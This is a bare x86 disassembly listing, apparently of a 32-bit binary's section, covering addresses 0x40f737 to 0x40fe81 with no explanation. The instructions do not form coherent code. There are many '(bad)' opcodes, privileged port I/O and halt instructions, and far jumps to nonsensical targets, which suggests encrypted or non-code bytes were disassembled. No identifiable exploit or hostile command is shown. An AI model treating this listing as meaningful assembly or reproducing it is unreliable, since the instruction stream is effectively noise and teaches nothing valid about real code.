  40f737:	mov    ?,WORD PTR [edx-0x567f8bd2]
  40f73d:	pop    edi
  40f73e:	clc    
  40f73f:	and    DWORD PTR [edi+esi*4-0x38],0xef4b5cca
  40f747:	add    eax,0x9d2196a5
  40f74c:	in     al,dx
  40f74d:	mov    al,0xfd
  40f74f:	jge    0x40f788
  40f751:	jmp    0xf67c:0x7b6f183c
  40f758:	jb     0x40f788
  40f75a:	test   DWORD PTR [edi+edx*8],0xf5b7de36
  40f761:	fld    DWORD PTR [eax+0x2a015908]
  40f767:	mov    ?,WORD PTR [ecx]
  40f769:	xlat   BYTE PTR ds:[ebx]
  40f76a:	icebp  
  40f76b:	push   ecx
  40f76c:	or     ecx,DWORD PTR [edi]
  40f76e:	sub    esp,DWORD PTR [edi]
  40f770:	add    esp,DWORD PTR [ecx]
  40f772:	mov    bh,BYTE PTR [edx+0x4c2801de]
  40f778:	(bad)  
  40f77a:	scas   al,BYTE PTR es:[edi]
  40f77b:	push   edx
  40f77c:	sbb    ebx,DWORD PTR [edi+0x24]
  40f77f:	cld    
  40f780:	jl     0x40f73d
  40f782:	inc    ecx
  40f783:	in     eax,dx
  40f784:	pop    ecx
  40f785:	mov    ah,0x1
  40f787:	push   eax
  40f788:	cmc    
  40f789:	xchg   ebx,eax
  40f78a:	mov    ecx,DWORD PTR [edi+0x1e713cdc]
  40f790:	mov    ch,0xe6
  40f792:	jl     0x40f794
  40f794:	xor    BYTE PTR [ebx+0x2abcfda5],ah
  40f79a:	aad    0xfc
  40f79c:	cwde   
  40f79d:	mov    ds:0xfb65ecb8,al
  40f7a2:	lahf   
  40f7a3:	int    0xab
  40f7a5:	xchg   esi,eax
  40f7a6:	bound  edx,QWORD PTR [eax+esi*1+0x9b97fb3]
  40f7ad:	addr16 dec edi
  40f7af:	push   es
  40f7b0:	jg     0x40f784
  40f7b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7b3:	loop   0x40f7ab
  40f7b5:	sub    eax,0x97d0458e
  40f7ba:	mov    ds:0xd07ff217,eax
  40f7bf:	add    BYTE PTR [esi-0xde9695],0x68
  40f7c6:	shl    ebx,0x9a
  40f7c9:	out    0x88,eax
  40f7cb:	mov    bh,0x5a
  40f7cd:	pop    edx
  40f7ce:	out    0x26,eax
  40f7d0:	jbe    0x40f82f
  40f7d2:	div    BYTE PTR ds:0xfb316fca
  40f7d8:	mov    WORD PTR ds:0xa340cf9a,?
  40f7de:	pop    ds
  40f7df:	cld    
  40f7e0:	xor    eax,ebx
  40f7e2:	stc    
  40f7e3:	out    0x9f,al
  40f7e5:	iret   
  40f7e6:	(bad)  
  40f7e7:	xor    DWORD PTR [ecx-0xc],esi
  40f7ea:	jns    0x40f81f
  40f7ec:	mov    ds:0xd51ea7dc,eax
  40f7f1:	rol    BYTE PTR [ebx],cl
  40f7f3:	aad    0xe
  40f7f5:	xor    al,0x1a
  40f7f7:	sbb    BYTE PTR [esi+0x60],bl
  40f7fa:	int3   
  40f7fb:	xor    eax,0x817cb62d
  40f800:	lahf   
  40f801:	adc    BYTE PTR cs:0xf3c0cf10,0xdb
  40f809:	jb     0x40f78c
  40f80b:	outs   dx,BYTE PTR ds:[esi]
  40f80c:	leave  
  40f80d:	into   
  40f80e:	ror    BYTE PTR [ebx+0xa],cl
  40f811:	fsub   DWORD PTR [eax-0x14bfe706]
  40f817:	mov    ebx,0x86655d2b
  40f81c:	js     0x40f7cc
  40f81e:	cmp    DWORD PTR [edx+0x7e],esi
  40f821:	cdq    
  40f822:	cli    
  40f823:	push   0xa4f8b71c
  40f828:	mov    ebp,0xc3d33bcb
  40f82d:	fcom   QWORD PTR [esi]
  40f82f:	test   al,0x65
  40f831:	not    DWORD PTR [edx+esi*1-0x18]
  40f835:	cs add edx,esp
  40f838:	test   BYTE PTR [edi],0xdf
  40f83b:	mov    ch,BYTE PTR [edx]
  40f83d:	pop    ss
  40f83e:	(bad)  
  40f83f:	hlt    
  40f840:	loopne 0x40f846
  40f842:	dec    eax
  40f843:	push   0xfcc4c7b9
  40f848:	sar    edx,cl
  40f84a:	inc    ebp
  40f84b:	std    
  40f84c:	mov    eax,ds:0x5fefeffe
  40f851:	rcr    dl,cl
  40f853:	shr    BYTE PTR [esi+0x53ffbec1],cl
  40f859:	push   es
  40f85a:	fild   QWORD PTR [eax-0x15]
  40f85d:	enter  0x3fa8,0x3c
  40f861:	xchg   ebp,eax
  40f862:	cmp    BYTE PTR [eax+0x61],dl
  40f865:	xor    DWORD PTR [ebx+edi*4+0x10],ebx
  40f869:	adc    dl,BYTE PTR [ebx-0x356e2ed7]
  40f86f:	rol    eax,cl
  40f871:	add    bl,BYTE PTR [edx]
  40f873:	addr16 xor eax,0xa39163ed
  40f879:	mov    ebp,0x6eb27b08
  40f87e:	mov    al,ds:0x41c692f4
  40f883:	cs push es
  40f885:	xor    dh,BYTE PTR [ebx]
  40f887:	jnp    0x40f827
  40f889:	iret   
  40f88a:	sbb    al,0x0
  40f88c:	xchg   ebx,eax
  40f88d:	pop    ecx
  40f88e:	ins    BYTE PTR es:[edi],dx
  40f88f:	ja     0x40f8c4
  40f891:	arpl   WORD PTR [esp+esi*8-0x62d308f6],ax
  40f898:	push   ebp
  40f899:	jge    0x40f850
  40f89b:	imul   BYTE PTR [eax+0x5dae3961]
  40f8a1:	adc    eax,0xa16f90ab
  40f8a6:	sub    al,0x83
  40f8a8:	inc    edx
  40f8a9:	pop    ss
  40f8aa:	adc    dh,BYTE PTR [ebx]
  40f8ac:	xchg   DWORD PTR [eax-0x5b421e01],eax
  40f8b2:	add    dl,al
  40f8b4:	ss push es
  40f8b6:	loope  0x40f873
  40f8b8:	loop   0x40f8d9
  40f8ba:	psubusb mm1,QWORD PTR [edi+0x3ac465e2]
  40f8c1:	ss jp  0x40f90c
  40f8c4:	inc    esi
  40f8c5:	mov    bl,0xdc
  40f8c7:	ss (bad) 
  40f8c9:	xchg   esi,eax
  40f8ca:	mul    BYTE PTR [ebp+0x12]
  40f8cd:	cmp    dl,BYTE PTR [edx]
  40f8cf:	ffree  st(7)
  40f8d1:	fimul  DWORD PTR [edx+0x7da0ed60]
  40f8d7:	add    ebx,esi
  40f8d9:	or     edx,eax
  40f8db:	jb     0x40f8fa
  40f8dd:	inc    edx
  40f8de:	rcr    BYTE PTR [edi],1
  40f8e0:	jge    0x40f94b
  40f8e2:	popa   
  40f8e3:	cld    
  40f8e4:	mov    bh,0xbb
  40f8e6:	and    ah,BYTE PTR ds:0xa18921cb
  40f8ec:	aad    0x30
  40f8ee:	lock ss cwde 
  40f8f1:	fdivr  st,st(5)
  40f8f3:	clc    
  40f8f4:	sub    ecx,esp
  40f8f6:	int    0xbc
  40f8f8:	div    edi
  40f8fa:	jo     0x40f92f
  40f8fc:	adc    eax,0xcfb48356
  40f901:	out    0x27,eax
  40f903:	aaa    
  40f904:	scas   al,BYTE PTR es:[edi]
  40f905:	sub    esp,eax
  40f907:	hlt    
  40f908:	xchg   esi,eax
  40f909:	fwait
  40f90a:	jbe    0x40f926
  40f90c:	xor    al,0x1c
  40f90e:	sti    
  40f90f:	pop    esp
  40f910:	and    BYTE PTR [ecx-0x7],ah
  40f913:	test   al,dl
  40f915:	icebp  
  40f916:	rcl    BYTE PTR [esi-0x37599b5c],cl
  40f91c:	retf   
  40f91d:	jns    0x40f950
  40f91f:	dec    ebp
  40f920:	pop    esi
  40f921:	mov    BYTE PTR [esi-0x69],dh
  40f924:	in     al,dx
  40f925:	mov    cl,0x62
  40f927:	out    dx,al
  40f928:	rol    BYTE PTR [edi],1
  40f92a:	ret    0xb5c3
  40f92d:	imul   ecx,DWORD PTR [esi],0xfffffff8
  40f930:	fsubrp st(6),st
  40f932:	pop    es
  40f933:	cli    
  40f934:	xor    al,0xbe
  40f936:	rcl    BYTE PTR [edx+0xf],1
  40f939:	mov    dl,BYTE PTR [edx-0x50]
  40f93c:	mov    ch,BYTE PTR [edi-0x55]
  40f93f:	pop    eax
  40f940:	js     0x40f8e0
  40f942:	in     eax,dx
  40f943:	repz in eax,dx
  40f945:	xchg   ecx,eax
  40f946:	mov    ebp,0xb73f5f8a
  40f94b:	mov    ch,0x2e
  40f94d:	xor    DWORD PTR [edx-0x1f1c1cbd],edi
  40f953:	in     al,dx
  40f954:	xor    al,0xc5
  40f956:	into   
  40f957:	mov    dl,0xfa
  40f959:	lds    ebx,FWORD PTR [ecx+esi*4-0xb]
  40f95d:	pop    edi
  40f95e:	bound  ebx,QWORD PTR [edx]
  40f960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f961:	push   ebx
  40f962:	push   esi
  40f963:	mov    bh,0xa1
  40f965:	mov    DWORD PTR ds:0xfcfacb3c,eax
  40f96b:	mov    dl,0xfa
  40f96d:	daa    
  40f96e:	or     ah,dl
  40f970:	pop    esp
  40f971:	dec    ebp
  40f972:	xor    eax,DWORD PTR [ebp-0x39]
  40f975:	scas   eax,DWORD PTR es:[edi]
  40f976:	xor    BYTE PTR [esi-0x3f],bh
  40f979:	ds xchg bh,dh
  40f97c:	xor    eax,DWORD PTR fs:[eax-0x2b]
  40f980:	pop    edi
  40f981:	xor    DWORD PTR [edx],ecx
  40f983:	mov    ds:0x7576a559,eax
  40f988:	push   ss
  40f989:	push   edi
  40f98a:	lahf   
  40f98b:	pop    esp
  40f98c:	or     ecx,DWORD PTR [ebx+0x29680863]
  40f992:	and    BYTE PTR ds:0x5daba7b1,ch
  40f998:	cmp    ch,BYTE PTR [esi-0x1201d4ab]
  40f99e:	cmp    eax,0xb33aa2f4
  40f9a3:	popf   
  40f9a4:	out    0x8a,al
  40f9a6:	jb     0x40f934
  40f9a8:	mov    ch,0xb5
  40f9aa:	sub    DWORD PTR [eax],ebp
  40f9ac:	pusha  
  40f9ad:	cmp    al,BYTE PTR [esi+0xc56d957]
  40f9b3:	into   
  40f9b4:	repnz test DWORD PTR [edi],ebp
  40f9b7:	pop    ss
  40f9b8:	push   0xfe2d3ca5
  40f9bd:	mov    ds:0xd7ed6ea4,eax
  40f9c2:	add    cl,ch
  40f9c4:	lods   al,BYTE PTR ds:[esi]
  40f9c5:	and    ebp,DWORD PTR [edi-0x1a]
  40f9c8:	sbb    eax,0xf7b2dfea
  40f9cd:	daa    
  40f9ce:	fldcw  WORD PTR [esi-0x51756b24]
  40f9d4:	dec    esi
  40f9d5:	jbe    0x40fa51
  40f9d7:	mov    esi,0xc9504f3c
  40f9dc:	cdq    
  40f9dd:	and    al,0x77
  40f9df:	into   
  40f9e0:	adc    eax,0xbd06418f
  40f9e5:	xor    DWORD PTR [edx-0xaf0421],0x6a
  40f9ec:	pop    esp
  40f9ed:	xor    bl,ch
  40f9ef:	or     al,BYTE PTR [edi+edi*1+0x11]
  40f9f3:	dec    esp
  40f9f4:	rol    DWORD PTR [edx+0x4acb1b1e],1
  40f9fa:	push   ds
  40f9fb:	push   ebp
  40f9fc:	ret    
  40f9fd:	and    DWORD PTR [esi+0x6b],edx
  40fa00:	sub    al,0x75
  40fa02:	jae    0x40f9d1
  40fa04:	xchg   DWORD PTR [ebx],ebp
  40fa06:	jb     0x40f9b8
  40fa08:	retf   0xc57f
  40fa0b:	test   al,0x71
  40fa0d:	push   eax
  40fa0e:	sti    
  40fa0f:	lds    eax,FWORD PTR fs:[ebx-0xd]
  40fa13:	adc    al,0x2c
  40fa15:	push   esi
  40fa16:	inc    ebx
  40fa17:	inc    edi
  40fa18:	cmp    eax,0x1ac30e5
  40fa1d:	dec    edi
  40fa1e:	and    DWORD PTR [edi+0x38c26a6d],0x72
  40fa25:	lods   eax,DWORD PTR ds:[esi]
  40fa26:	jmp    0xbe68:0x517a4cc6
  40fa2d:	dec    edi
  40fa2e:	scas   al,BYTE PTR es:[edi]
  40fa2f:	pushf  
  40fa30:	and    dh,BYTE PTR [ecx+0xa]
  40fa33:	pop    edi
  40fa34:	or     ebp,edi
  40fa36:	or     eax,0x62d0dd5b
  40fa3b:	or     al,0x43
  40fa3d:	sbb    edx,DWORD PTR [esi+0xc73dd8]
  40fa43:	gs ss push es
  40fa46:	mov    BYTE PTR [ebx-0x124cb7b9],dl
  40fa4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa4d:	stos   BYTE PTR es:[edi],al
  40fa4e:	call   0x7143:0x9f2e83d6
  40fa55:	push   edx
  40fa56:	aam    0x34
  40fa58:	jne    0x40fa91
  40fa5a:	in     al,dx
  40fa5b:	outs   dx,BYTE PTR ds:[esi]
  40fa5c:	xor    eax,0xe3b7405
  40fa61:	test   DWORD PTR [ebx+eax*8],edi
  40fa64:	and    bh,ah
  40fa66:	cld    
  40fa67:	in     eax,0x23
  40fa69:	lds    ecx,FWORD PTR [ebp+ebx*2-0x6accf7f7]
  40fa70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa71:	gs stc 
  40fa73:	or     eax,0x7f887de2
  40fa78:	jl     0x40fab3
  40fa7a:	pushf  
  40fa7b:	retf   0xea93
  40fa7e:	ins    DWORD PTR es:[edi],dx
  40fa7f:	loopne 0x40fa14
  40fa81:	xor    edx,DWORD PTR [ecx+0x7d89b5b5]
  40fa87:	ja     0x40fa0f
  40fa89:	mov    ds:0x6a8cf459,al
  40fa8e:	rol    BYTE PTR [ebx+edx*2],cl
  40fa91:	das    
  40fa92:	outs   dx,DWORD PTR ds:[esi]
  40fa93:	jnp    0x40faee
  40fa95:	lods   al,BYTE PTR ds:[esi]
  40fa96:	cmc    
  40fa97:	loopne 0x40fa37
  40fa99:	jecxz  0x40fb17
  40fa9b:	xchg   esp,eax
  40fa9c:	jmp    0xd72f43bd
  40faa1:	outs   dx,BYTE PTR ds:[esi]
  40faa2:	xchg   edi,eax
  40faa3:	iret   
  40faa4:	xlat   BYTE PTR ds:[ebx]
  40faa5:	and    BYTE PTR [eax+0x58aaefed],0x55
  40faac:	mov    ah,0xe0
  40faae:	retf   
  40faaf:	lods   al,BYTE PTR ds:[esi]
  40fab0:	xor    bh,BYTE PTR [edx]
  40fab2:	inc    ecx
  40fab3:	pushf  
  40fab4:	dec    ebp
  40fab5:	sub    edx,DWORD PTR [ebp+0x35309a94]
  40fabb:	iret   
  40fabc:	xor    ah,ch
  40fabe:	pop    ebx
  40fabf:	cs sub eax,0x57087762
  40fac5:	inc    ebp
  40fac6:	repnz ds dec edx
  40fac9:	nop
  40faca:	inc    esp
  40facb:	enter  0xbbb1,0x35
  40facf:	cmp    eax,0x83794e9c
  40fad4:	cdq    
  40fad5:	pop    edi
  40fad6:	lock mov fs,WORD PTR [esi+0x3c]
  40fada:	ins    DWORD PTR es:[edi],dx
  40fadb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fadc:	lods   eax,DWORD PTR ds:[esi]
  40fadd:	(bad)  
  40fade:	sub    al,0x4
  40fae0:	fnclex 
  40fae2:	mov    ds:0x6d59cbc3,eax
  40fae7:	push   ebx
  40fae8:	out    dx,al
  40fae9:	jmp    0x636d:0x7de8df7a
  40faf0:	sbb    eax,0xb6035f1f
  40faf5:	mov    esp,0x3744efa5
  40fafa:	xchg   ecx,eax
  40fafb:	jbe    0x40fb6f
  40fafd:	xchg   esi,eax
  40fafe:	jbe    0x40fb23
  40fb00:	cmp    edi,esp
  40fb02:	into   
  40fb03:	cmp    eax,0xc4de0442
  40fb08:	cli    
  40fb09:	xchg   BYTE PTR [ecx+0x4d],bh
  40fb0c:	pop    ds
  40fb0d:	jmp    0x40faef
  40fb0f:	mov    eax,0x6482b5c
  40fb14:	jmp    esi
  40fb16:	pop    esi
  40fb17:	enter  0x84f8,0xde
  40fb1b:	xor    DWORD PTR [edx+0x3d],edi
  40fb1e:	adc    esp,DWORD PTR [ecx+0x1]
  40fb21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb22:	(bad)  
  40fb23:	cmp    DWORD PTR [ebx*8+0x17e56753],ebp
  40fb2a:	sbb    eax,0xbe1da598
  40fb2f:	lods   al,BYTE PTR ds:[esi]
  40fb30:	push   esp
  40fb31:	mov    eax,0x8b1fad4e
  40fb36:	cld    
  40fb37:	bound  ebx,QWORD PTR [eax-0x2464efa8]
  40fb3d:	mov    DWORD PTR [esi],esp
  40fb3f:	cmp    eax,DWORD PTR [ecx+esi*8]
  40fb42:	pop    ds
  40fb43:	sub    bh,BYTE PTR [edi+0x11bb68d8]
  40fb49:	lea    ebx,[ebx]
  40fb4b:	sahf   
  40fb4c:	lods   al,BYTE PTR ds:[esi]
  40fb4d:	and    eax,0x1a1f8efa
  40fb52:	adc    ch,BYTE PTR [esi-0x36438d4f]
  40fb58:	adc    bl,BYTE PTR [eax-0x7ae31ba]
  40fb5e:	push   DWORD PTR [eax+0xa]
  40fb61:	dec    edi
  40fb62:	int3   
  40fb63:	gs ds cmp al,0xb0
  40fb67:	ss adc dl,cl
  40fb6a:	not    BYTE PTR [esi+0x48]
  40fb6d:	cdq    
  40fb6e:	and    BYTE PTR [bx],0x1b
  40fb72:	push   ss
  40fb73:	sub    DWORD PTR [ebx-0x7c],edi
  40fb76:	out    0x89,al
  40fb78:	jg     0x40fb23
  40fb7a:	mov    ebp,ss
  40fb7c:	leave  
  40fb7d:	and    DWORD PTR [esi+0x40f606f3],ecx
  40fb83:	and    DWORD PTR [ebx-0x18d3e79f],edi
  40fb89:	ret    0x3a70
  40fb8c:	jmp    DWORD PTR [esi-0xd]
  40fb8f:	mov    al,ds:0x892df4a8
  40fb94:	sar    DWORD PTR [esp+ecx*8],1
  40fb97:	bound  esi,QWORD PTR [esi+0x2b767fd6]
  40fb9d:	out    dx,al
  40fb9e:	ss mov BYTE PTR ss:[edi+0x32],dl
  40fba3:	div    dh
  40fba5:	jg     0x40fb38
  40fba7:	dec    ebx
  40fba9:	shr    DWORD PTR [ebx],0x82
  40fbac:	add    DWORD PTR [edi-0x6c1627a5],eax
  40fbb2:	sar    BYTE PTR [eax],0xe6
  40fbb5:	dec    esp
  40fbb6:	arpl   dx,di
  40fbb8:	loopne 0x40fc2e
  40fbba:	stos   BYTE PTR es:[edi],al
  40fbbb:	pushf  
  40fbbc:	aas    
  40fbbd:	fldenv [ebp+0x7dd22afe]
  40fbc3:	xchg   BYTE PTR [eax],dh
  40fbc5:	push   eax
  40fbc6:	cmp    bl,dl
  40fbc8:	and    ebx,DWORD PTR [esp-0x2]
  40fbcc:	outs   dx,DWORD PTR ds:[esi]
  40fbcd:	sahf   
  40fbce:	mov    ebp,0x2575145f
  40fbd3:	mov    DWORD PTR [eax+0x2afcd6a0],0x305d2ce4
  40fbdd:	push   0xed424938
  40fbe2:	arpl   WORD PTR [eax-0x14],si
  40fbe5:	push   ecx
  40fbe6:	loop   0x40fbeb
  40fbe8:	jns    0x40fb71
  40fbea:	in     eax,0x41
  40fbec:	cdq    
  40fbed:	shr    DWORD PTR [eax],0xcc
  40fbf0:	xchg   BYTE PTR [ecx],ah
  40fbf2:	mov    ebx,0x76a51f04
  40fbf7:	dec    eax
  40fbf8:	xchg   ebp,eax
  40fbf9:	jb     0x40fba1
  40fbfb:	inc    ebp
  40fbfc:	jp     0x40fc5e
  40fbfe:	stc    
  40fbff:	popa   
  40fc00:	mov    ds:0x8b3828a4,eax
  40fc05:	mov    al,0xf4
  40fc07:	enter  0x26e2,0xf2
  40fc0b:	pop    esp
  40fc0c:	loope  0x40fc52
  40fc0e:	jbe    0x40fc47
  40fc10:	push   esp
  40fc11:	jnp    0x40fc01
  40fc13:	fisub  WORD PTR [ebx]
  40fc15:	in     eax,0x2f
  40fc17:	push   cs
  40fc18:	cdq    
  40fc19:	push   esp
  40fc1a:	pop    ds
  40fc1b:	scas   al,BYTE PTR es:[edi]
  40fc1c:	shl    DWORD PTR [ebx-0x35af670a],1
  40fc22:	xchg   ecx,eax
  40fc23:	loopne 0x40fc6c
  40fc25:	repnz rcl DWORD PTR [edi],1
  40fc28:	loopne 0x40fbb9
  40fc2a:	aad    0xd1
  40fc2c:	clc    
  40fc2d:	mov    bh,0x17
  40fc2f:	mov    WORD PTR [esi-0x2a],cs
  40fc32:	xor    edi,DWORD PTR [edx]
  40fc34:	mov    dl,0x50
  40fc36:	cli    
  40fc37:	xchg   edx,eax
  40fc38:	mov    ah,0x71
  40fc3a:	in     al,dx
  40fc3b:	pop    ss
  40fc3c:	mov    ecx,0xb647b580
  40fc41:	lds    ebx,FWORD PTR [edi+edi*2-0x75c4a60e]
  40fc48:	xor    ah,BYTE PTR [eax-0x5480ee7c]
  40fc4e:	pop    edx
  40fc4f:	jmp    0x40fcb7
  40fc51:	neg    DWORD PTR [edx-0x203bb4b8]
  40fc57:	popa   
  40fc58:	arpl   WORD PTR [ecx],di
  40fc5a:	in     eax,0x5b
  40fc5c:	pop    ebx
  40fc5d:	enter  0x9f1,0xda
  40fc61:	in     al,0xd1
  40fc63:	ror    BYTE PTR [ecx],0xd9
  40fc66:	xor    BYTE PTR [ebx-0x7ab4d1d9],dh
  40fc6c:	nop
  40fc6d:	in     eax,0x5d
  40fc6f:	push   0x60cc9f21
  40fc74:	adc    bh,bl
  40fc76:	hlt    
  40fc77:	daa    
  40fc78:	jg     0x40fc81
  40fc7a:	sbb    eax,0xc62c8210
  40fc7f:	cs (bad) 
  40fc81:	pop    ecx
  40fc82:	std    
  40fc83:	jge    0x40fc25
  40fc85:	int3   
  40fc86:	cdq    
  40fc87:	or     DWORD PTR [ecx],esp
  40fc89:	pop    es
  40fc8a:	adc    edx,DWORD PTR [eax-0x6eddc79a]
  40fc90:	je     0x40fcb2
  40fc92:	mov    dh,0xf7
  40fc94:	fnsave [edi]
  40fc96:	pop    edx
  40fc97:	push   esp
  40fc98:	das    
  40fc99:	mov    dh,0xd3
  40fc9b:	dec    esp
  40fc9c:	jae    0x40fd02
  40fc9e:	xor    eax,0x1978820e
  40fca3:	sub    BYTE PTR [esi-0x21f66514],0x68
  40fcaa:	fsubr  DWORD PTR [eax+0x68]
  40fcad:	scas   al,BYTE PTR es:[edi]
  40fcae:	leave  
  40fcaf:	dec    ebx
  40fcb0:	ret    0x34af
  40fcb3:	inc    eax
  40fcb4:	(bad)  
  40fcb5:	dec    ebx
  40fcb6:	lods   eax,DWORD PTR ds:[esi]
  40fcb7:	push   cs
  40fcb8:	neg    DWORD PTR [ebx]
  40fcba:	sub    al,0x46
  40fcbc:	and    al,0x27
  40fcbe:	mov    ecx,ebx
  40fcc0:	rcr    BYTE PTR [edx+0x3fa97514],1
  40fcc6:	loope  0x40fcd8
  40fcc8:	cmp    eax,0x7eba8dfd
  40fccd:	leave  
  40fcce:	enter  0xba8,0x4e
  40fcd2:	stc    
  40fcd3:	lods   eax,DWORD PTR cs:[esi]
  40fcd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcd6:	mov    eax,ds:0x110c9df1
  40fcdb:	jbe    0x40fd1f
  40fcdd:	jg     0x40fd11
  40fcdf:	test   DWORD PTR [ebx],esp
  40fce1:	into   
  40fce2:	ds cli 
  40fce4:	xor    DWORD PTR [ecx],edx
  40fce6:	mov    ebp,0x1592448f
  40fceb:	lahf   
  40fcec:	inc    esi
  40fced:	shr    dl,0x30
  40fcf0:	push   ecx
  40fcf1:	scas   al,BYTE PTR es:[edi]
  40fcf2:	(bad)  
  40fcf3:	in     eax,dx
  40fcf4:	pop    ebp
  40fcf5:	mov    DWORD PTR [esi+ecx*1-0x5cd620a5],esp
  40fcfc:	xor    ebx,DWORD PTR [ebx]
  40fcfe:	test   eax,0x1363741c
  40fd03:	or     BYTE PTR [ebx+0x78],dl
  40fd06:	jbe    0x40fd62
  40fd08:	mov    eax,0xbcfebdde
  40fd0d:	sub    al,0xe5
  40fd0f:	lmsw   WORD PTR [ebp+esi*4-0x49c7950f]
  40fd17:	push   cs
  40fd18:	push   ds
  40fd19:	add    bl,BYTE PTR [edx+esi*2]
  40fd1c:	inc    ebp
  40fd1d:	jl     0x40fcdf
  40fd1f:	jmp    0x537b:0x8d687b5
  40fd26:	and    DWORD PTR [ebx+0x4d],0x78
  40fd2a:	cmp    DWORD PTR es:[eax-0x1105321e],esp
  40fd31:	jbe    0x40fd9a
  40fd33:	xchg   BYTE PTR [ecx],dh
  40fd35:	and    DWORD PTR ds:0xec272c18,edx
  40fd3b:	pop    ebx
  40fd3c:	push   ds
  40fd3d:	mov    bl,0xb7
  40fd3f:	mov    ds:0xd4ada3d3,eax
  40fd44:	fist   WORD PTR [eax+edi*4]
  40fd47:	mov    dh,0xbe
  40fd49:	and    cl,BYTE PTR [edx]
  40fd4b:	nop
  40fd4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd4d:	inc    edx
  40fd4e:	mov    ebp,0xebc4cdc5
  40fd53:	jp     0x40fdb6
  40fd55:	loop   0x40fd71
  40fd57:	pop    eax
  40fd58:	add    ebp,DWORD PTR [ecx]
  40fd5a:	or     edi,DWORD PTR [edi]
  40fd5c:	sbb    BYTE PTR [edx+0x70],dl
  40fd5f:	popf   
  40fd60:	dec    ebp
  40fd61:	add    DWORD PTR [esi+0x2],ebx
  40fd64:	imul   DWORD PTR [esi+0x6beeb464]
  40fd6a:	add    dh,ah
  40fd6c:	arpl   ax,ax
  40fd6e:	cmp    DWORD PTR [esi-0x25ab8ebe],edx
  40fd74:	cli    
  40fd75:	cld    
  40fd76:	call   0xd8bc:0xa85e7678
  40fd7d:	rol    BYTE PTR [ebx+0x62],1
  40fd80:	test   BYTE PTR [eax+0x5678de9e],dl
  40fd86:	jl     0x40fd41
  40fd88:	mov    gs,WORD PTR [eax-0x758a1700]
  40fd8e:	sub    esp,esp
  40fd90:	xchg   esi,eax
  40fd91:	pop    ecx
  40fd92:	push   esp
  40fd93:	out    dx,eax
  40fd94:	xchg   ebp,eax
  40fd95:	es jno 0x40fd2f
  40fd98:	and    al,0xc5
  40fd9a:	push   ds
  40fd9b:	mov    dl,0x86
  40fd9d:	push   0xd1315634
  40fda2:	rol    BYTE PTR [eax+0x37],cl
  40fda5:	xlat   BYTE PTR ds:[ebx]
  40fda6:	int    0xb3
  40fda8:	mov    ah,0x2e
  40fdaa:	dec    ebp
  40fdab:	(bad)  
  40fdac:	xchg   edx,eax
  40fdad:	(bad)  
  40fdae:	out    0x28,al
  40fdb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdb1:	rcl    esp,cl
  40fdb3:	xor    eax,esp
  40fdb5:	outs   dx,BYTE PTR ds:[esi]
  40fdb6:	outs   dx,BYTE PTR fs:[esi]
  40fdb8:	scas   eax,DWORD PTR es:[edi]
  40fdb9:	not    DWORD PTR [ecx+0x19]
  40fdbc:	nop
  40fdbd:	jg     0x40fdb0
  40fdbf:	push   cs
  40fdc0:	leave  
  40fdc1:	das    
  40fdc2:	fwait
  40fdc3:	add    al,0xca
  40fdc5:	test   eax,0x9223b7ea
  40fdca:	or     BYTE PTR [esi],dl
  40fdcc:	sbb    eax,0xc258d059
  40fdd1:	mov    ah,0xab
  40fdd3:	mov    dh,0x75
  40fdd5:	sbb    eax,0x9d145daa
  40fdda:	jp     0x40fdbd
  40fddc:	xor    DWORD PTR [ebx+0x249bebd],ebp
  40fde2:	xor    BYTE PTR [edx-0x246112fc],bh
  40fde8:	lods   al,BYTE PTR ds:[esi]
  40fde9:	jno    0x40fe29
  40fdeb:	xor    bl,al
  40fded:	jb     0x40fd7d
  40fdef:	mov    bl,0xc3
  40fdf1:	push   es
  40fdf2:	push   ds
  40fdf3:	das    
  40fdf4:	mov    edi,0x8c5ae6ee
  40fdf9:	push   eax
  40fdfa:	out    0xde,al
  40fdfc:	popf   
  40fdfd:	jle    0x40fe39
  40fdff:	sub    al,BYTE PTR [eax+0x28]
  40fe02:	mov    ds:0x222d29e6,al
  40fe07:	adc    edi,DWORD PTR ds:[edx-0x6a022d51]
  40fe0e:	fistp  WORD PTR gs:[ebx-0x6fd5c34]
  40fe15:	inc    esp
  40fe16:	jbe    0x40fded
  40fe18:	ror    BYTE PTR [ecx],cl
  40fe1a:	mov    bl,0x7f
  40fe1c:	and    esi,DWORD PTR es:[ecx]
  40fe1f:	and    dl,dh
  40fe21:	sahf   
  40fe22:	scas   eax,DWORD PTR es:[edi]
  40fe23:	pop    ebx
  40fe24:	xor    DWORD PTR [esi+0x28],0x37
  40fe28:	sub    dl,BYTE PTR [esi-0x42]
  40fe2b:	xchg   ecx,eax
  40fe2c:	aam    0x58
  40fe2e:	aad    0xb5
  40fe30:	jb     0x40fdf2
  40fe32:	mov    edi,0xd3f31b35
  40fe37:	sub    DWORD PTR [edi],eax
  40fe39:	jae    0x40fe01
  40fe3b:	rcr    bh,1
  40fe3d:	add    BYTE PTR [ecx+0x6f8b58b4],ah
  40fe43:	cmp    DWORD PTR [eax-0xbcb51f5],eax
  40fe49:	stc    
  40fe4a:	popf   
  40fe4b:	ror    bl,0x7d
  40fe4e:	stos   DWORD PTR es:[edi],eax
  40fe4f:	shl    DWORD PTR cs:[esi],1
  40fe52:	and    bl,bh
  40fe54:	mov    edi,0xc3647e54
  40fe59:	inc    ebp
  40fe5a:	sar    BYTE PTR [eax+0x5c11c352],0xd0
  40fe61:	(bad)  
  40fe62:	inc    BYTE PTR [edi]
  40fe64:	mov    BYTE PTR [ebx-0x2f29b033],ch
  40fe6a:	aaa    
  40fe6b:	dec    ecx
  40fe6c:	mov    DWORD PTR [esi-0x3bec3b9],esp
  40fe72:	(bad)  
  40fe73:	int    0xab
  40fe75:	cmp    ah,bl
  40fe77:	and    al,0x2c
  40fe79:	fcomp  DWORD PTR [edi+0xc]
  40fe7c:	fs into 
  40fe7e:	outs   dx,DWORD PTR ds:[esi]
  40fe80:	pop    ss
  40fe81:	cs xchg BYTE PTR gs:[esp+edx*8],dl
